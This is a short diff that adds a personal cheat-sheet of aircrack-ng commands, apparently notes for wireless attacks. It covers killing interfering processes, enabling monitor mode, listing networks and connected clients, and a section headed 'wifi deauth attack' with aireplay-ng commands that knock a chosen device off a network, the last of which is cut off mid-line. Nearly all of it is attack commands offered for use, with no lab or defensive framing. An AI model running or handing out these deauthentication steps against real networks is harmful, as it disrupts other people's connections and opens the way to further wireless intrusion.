@@ -1,0 +1,9 @@
+=====================other===========================
+airmon-ng check kill FIRST STEP IN MONITOR MODE SETUP
+airmon-ng start wlan0 SECOND SETP IN MONITOR MODE SETUP
+airodump-ng -c "channel" wlan1mon KEEP INTERFACE ON CHANNEL
+==========================wifi deauth attack=========================== (specify interface)
+airodump-ng wlan0mon SHOW NETWORKS
+airodump-ng --channel "number" --bssid "bssid" SHOW DEVICE CONNECTED TO A SPECIFIC NETWORK
+aireplay-ng --deauth "number of packets (0 to continously send)" -a "bssid" -c "mac address" wlan0mon TARGETED DEAUTH ATTACK
+aireplay-ng -0 "numberb of packets" -a "bssid" 
